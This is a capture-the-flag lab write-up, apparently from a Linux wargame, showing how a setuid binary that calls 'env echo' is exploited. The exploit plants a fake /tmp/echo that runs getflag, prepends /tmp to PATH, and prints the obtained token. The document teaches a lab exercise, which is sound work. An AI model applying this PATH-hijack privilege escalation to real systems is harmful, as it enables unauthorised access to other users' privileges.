# Level 03 - Path Manipulation Exploit

## Step 1: Examine available files

First, let's check what files we have in the current directory:

```sh
ls -l
```

We find a file named `level03` with the following permissions:

```
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```

Owner of that file is flag03 user.

If we execute it, we will see message
```
Exploit me
```

Let's open this binary with `strings` and find with `grep Exploit`

```
strings level03 | grep Exploit
```

Result is

```
/usr/bin/env echo Exploit me
```

We see that this command uses echo from env to print message, this means that we can change PATH in env and rewrite echo command to run `getflag` in user flag03.

To do it, we add /tmp folder to the begining of PATH, and add to /tmp folder (only one folder in which we can edit) executable file called `echo` and make it execute /bin/getflag when call.

```
echo '/bin/getflag' > /tmp/echo
chmod 777 /tmp/echo
export PATH=/tmp:$PATH
./level03
```

And we get our flag:

```
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```
